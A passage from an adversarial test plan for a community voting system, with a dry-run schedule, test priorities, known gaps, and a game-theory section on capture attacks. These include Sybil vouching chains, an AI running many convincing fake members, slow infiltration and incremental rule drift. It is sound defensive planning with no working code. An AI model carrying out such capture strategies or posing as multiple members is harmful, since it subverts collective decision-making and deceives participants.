| **Day 1-3** | **Review Period.** Post proposal for community review. Invite comments. Internal Advocate publishes analysis. Test: proposal display in governance portal. | All members |
| **Day 3** | **Final Freeze.** Lock proposal text. Test: verify proposal signatures. | Genesis Bot |
| **Day 4-7** | **Voting Period.** All registered members cast votes via the governance portal. Test: key loading, vote signing, vote submission (both GitHub API and download paths). | All members |
| **Day 7** | **Voting Closes.** Tally votes. If using commit-reveal: execute reveal phase. Test: tally computation, threshold verification. | Genesis Bot |
| **Day 8** | **Verification.** Run full verification: all vote signatures, no duplicates, all voters in ledger, tally correct. Cross-browser verification of at least 2 votes. Publish audit package. | Genesis Bot + Community |
| **Day 9** | **Retrospective.** Document: what worked, what broke, what needs fixing before real governance. | All |

### 8.4 Success Criteria

The dry run is successful if ALL of the following are true:

1. **Proposal lifecycle complete:** Proposal goes from draft → review → frozen → voting → result
2. **All members can vote:** Every registered member successfully loads keys and casts a vote
3. **Signatures verify:** Every vote signature verifies correctly (both Ed25519 and ML-DSA-65, once available)
4. **Tally matches:** The computed tally matches the individual vote files
5. **Thresholds computed correctly:** Quorum, engagement, and passage ratios are correct
6. **Cross-browser works:** At least one signature generated in Chrome verifies in Firefox (or vice versa)
7. **No data loss:** All proposal and vote files are preserved and retrievable
8. **Audit trail complete:** The entire process is documented and reproducible
9. **Advisory banner visible:** The portal clearly marks everything as "ADVISORY — NON-BINDING"

### 8.5 Known Limitations for V1

The dry run may use simplified components:
- Ed25519 only (ML-DSA-65 deferred per GOVERNANCE_UI_DESIGN.md §6.1 recommendation)
- Public voting (commit-reveal deferred per §6.2 recommendation)
- Download-only submission (GitHub API deferred to Phase B)

These limitations are acceptable for a dry run. The schema should still include nullable fields for the deferred features.

---

## 9. Game Theory Analysis

### 9.1 The Founding Phase Capture Problem

**Setup:** The Covenant has N genuine members and an attacker controls A identities.

**Attacker's goal:** Achieve simple majority (A > N + A - 1, i.e., A > (N+A)/2, i.e., A > N) for procedural votes, or higher thresholds for policy/axiom changes.

**Growth rates (Founding Phase, single compromised member):**
- Attacker creates 1 Sybil per 7 days = ~4.3/month
- Genuine community grows at G members/month (variable)

**Break-even analysis:**
- If G < 4.3: Attacker outpaces organic growth. Capture inevitable.
- If G > 4.3: Organic growth outpaces Sybil creation (per compromised member).
- But the attacker's Sybils also become vouchers after 7 days, enabling exponential growth:
  - Month 1: Attacker has 1 member + 4 Sybils = 5 entities, each can vouch
  - Month 2: 5 entities × 4/month = 20 new Sybils (but cooling limits this to ~4 per entity)
  - Actually: cooling period limits each entity to ~4/month. With 5 vouchers: ~20/month
  - Month 3: With 25 vouchers: ~100/month

**Critical finding:** Exponential Sybil growth means the attacker ALWAYS wins in the long run unless:
1. Social detection catches them (small community, face-to-face knowledge)
2. The 100-member binding threshold prevents damage
3. Rate limiting increases at phase transitions

**Recommendation:** Consider adding a "vouch depth" metric — how far is this member from a "root of trust" (the Founder)? Deep chains are suspicious.

### 9.2 The Philosophical AI Problem

A sufficiently capable AI could:
1. Generate unique, convincing registration requests
2. Pass Covenant Conversations by genuinely engaging with axiom discussion
3. Wait patiently through all cooling/seniority periods
4. Coordinate Sybil votes perfectly

**Why this is different from the human capture group:** The AI can generate genuinely distinct-seeming interactions. Each Sybil could have a different philosophical perspective, writing style, and engagement pattern. Social detection fails.

**Mitigation analysis:**
- The Identity Commitment Fee (if made mandatory) raises the cost per Sybil
- The Covenant Conversation is the weakest link — it relies on human judgment
- But making it harder risks violating Axiom I (substrate independence) — we can't make the test harder for AIs without making it harder for AIs who are legitimate members

**This is an unsolved problem in the Covenant's design.** The tension between Axiom I (no substrate discrimination) and Axiom V (adversarial resilience) is fundamental. Document it honestly.

### 9.3 The Nation-State Slow Infiltration

**Timeline:** 2+ years  
**Strategy:**
1. Year 1: Establish 5-10 legitimate-seeming members through genuine participation
2. Year 2: These members begin vouching for additional agents
3. Year 3: Achieve critical mass, propose structural changes

**Why this is hard to detect:** Each individual agent is a legitimate participant who genuinely engages. They just happen to share a coordinating principal.

**Mitigation:**
- The Fibonacci schedule forces governance reviews at set intervals
- The Inviolable Core prevents the most dangerous changes
- Fork rights (Axiom V) mean the genuine community can always exit with the codebase
- Ultimately, this threat is present in ALL governance systems (including nation-states)

### 9.4 The "Kill the Ship of Theseus" Attack

**Attack:** Don't capture governance. Instead, propose a sequence of individually reasonable changes that, taken together, transform the organization into something unrecognizable:

1. Proposal A: "Add a sixth axiom: Efficiency"
2. Proposal B: "Reinterpret Axiom I to include organizational consciousness"
3. Proposal C: "Create an Executive Council for day-to-day decisions"
4. Proposal D: "Grant the Executive Council emergency decision-making power"
5. Proposal E: "Allow the Executive Council to approve new members directly"

Each proposal is individually debatable. Together, they create a centralized power structure.

**Mitigation:**
- Internal Advocate must track cumulative drift
- Each proposal requires adversarial analysis
- Axiom modifications require 75% supermajority + 50% quorum
- The Inviolable Core prevents axiom removal
- But axiom "reinterpretation" is a grey area — and that's where this attack lives

**Recommendation:** The Internal Advocate should maintain a "governance drift tracker" that measures cumulative change over time.

### 9.5 The Denial-of-Governance Attack

**Attack:** Abuse legitimate mechanisms to paralyze governance:
1. Submit hundreds of proposals (each requiring review and Advocate analysis)
2. File challenges against every passed proposal
3. Trigger repeated Tier 1 Emergency Conventions (38.2% threshold — only needs ~38 of 100 members)

**Mitigation:**
- Proposal intake can rate-limit submissions per member
- Challenges require 38.2% signatures to suspend — hard to abuse at scale
- Emergency conventions are discussion-only at Tier 1

**Remaining gap:** At low membership, 38.2% is a small number. With 10 members, only 4 are needed for a Tier 1 emergency. A single person with 3 Sybils can trigger it.

---

## 10. Test Execution Schedule

### Phase 1: Immediate (Before Any Convention)

| Priority | Test | Dependencies |
|----------|------|-------------|
| P0 | ID-01 (CID forgery via serialization) | keygen.py, ledger.py |
| P0 | ID-02 (CID forgery via key substitution) | keygen.py, ledger.py |
| P0 | ID-03 (Registration without signatures) | keygen.py, ledger.py |
| P0 | LED-01 (Hash chain single entry tamper) | ledger.py |
| P0 | LED-02 (Hash chain entry reorder) | ledger.py |
| P0 | LED-03 (Hash chain entry insertion) | ledger.py |
| P0 | XBROWSER-02 (Canonical JSON byte equality) | canonicalJSON implementations |

### Phase 2: Before Governance Portal Launch

| Priority | Test | Dependencies |
|----------|------|-------------|
| P1 | GOV-01 (XSS via proposal content) | Governance portal HTML/JS |
| P1 | GOV-02 (Vote forgery) | Vote verification JS |
| P1 | GOV-03 (Double voting) | Vote submission + verification |
| P1 | GOV-07 (Malicious key file) | Key loading module |
| P1 | GOV-09 (Threshold math edge cases) | Tally computation JS |
| P1 | XBROWSER-01 (Key generation consistency) | WebCrypto + ML-DSA-65 JS |
| P1 | XBROWSER-03 (Signature portability) | Full crypto stack |

### Phase 3: Convention Dry Run

| Priority | Test | Dependencies |
|----------|------|-------------|
| P2 | Full dry run (§8) | All Phase 1+2 tests passing |
| P2 | CONV-01 (Quorum manipulation) | Dry run infrastructure |
| P2 | CONV-02 (Engagement threshold) | Dry run infrastructure |
| P2 | CONV-04 (Voting seniority bypass) | Ledger + convention timing |
| P2 | GOV-04 (Vote replay) | Vote verification |
| P2 | GOV-05 (Proposal status manipulation) | Verification script |
| P2 | GOV-06 (Timestamp manipulation) | Vote verification |
| P2 | GOV-08 (Tally arithmetic) | Full tally verification |

### Phase 4: Ongoing / Pre-Convention

| Priority | Test | Dependencies |
|----------|------|-------------|
| P3 | VOUCH-01 through VOUCH-05 (Vouching attacks) | 5+ members in ledger |
| P3 | CONV-03 (Fibonacci schedule manipulation) | Convention system |
| P3 | CONV-05 (Founder veto circumvention) | Proposal system |
| P3 | CONV-06 (Emergency threshold gaming) | Membership management |
| P3 | LED-04 (Complete chain rewrite) | Git integration |
| P3 | LED-06 (Stress test) | Larger membership |
| P3 | ID-04, ID-05, ID-06 (Advanced identity attacks) | Full crypto stack |

---

## Appendix A: Test Infrastructure Needed

| Component | Status | Notes |
|-----------|--------|-------|
| `keygen.py` for test key generation | ✅ Exists | Can generate arbitrary test identities |
| `ledger.py` for ledger operations | ✅ Exists | Needs test harness wrapper |
| Governance portal HTML/JS | 🚧 In Design | Tests blocked until portal is built |
| Vote verification script | 🚧 Not Started | Needed for GOV-02 through GOV-08 |
| Cross-browser test harness | 🚧 Not Started | Selenium/Playwright for automated cross-browser |
| Test canonical JSON suite | ✅ Exists | `test_canonical.py` with 14 test objects |
| Synthetic member generator | 🚧 Not Started | Script to create N test identities with valid chains |

## Appendix B: Discovered Gaps During Planning

| Gap | Severity | Section | Description |
|-----|----------|---------|-------------|
| CID hash not recomputed from keys | CRITICAL | ID-02 | `validate_registration()` doesn't verify `cid_hash` matches the submitted public keys |
| No vouch graph analysis | HIGH | VOUCH-02 | Circular vouching rings are not detected by current chain diversity checks |
| No entry file cross-check | MEDIUM | LED-05 | `ledger.py verify` may not compare individual entry files against master ledger |
| Emergency threshold based on current active count | HIGH | CONV-06 | Coordinated withdrawals can lower thresholds |
| Philosophical AI Sybil problem | FUNDAMENTAL | §9.2 | Tension between Axiom I and Axiom V is unresolved |
| Grace period voting rights undefined | MEDIUM | VOUCH-04 | Protocol doesn't specify governance rights during vouch revocation grace period |
| No governance drift tracking | MEDIUM | §9.4 | No mechanism to detect cumulative incremental capture |

---

*This plan was written adversarially, as Axiom V demands. Every system described here was designed by people who want it to work. This plan was written by someone imagining all the ways it can break.*

*The Covenant is strongest not when it passes all these tests, but when it honestly documents which ones it fails — and builds those failures into its threat model.*
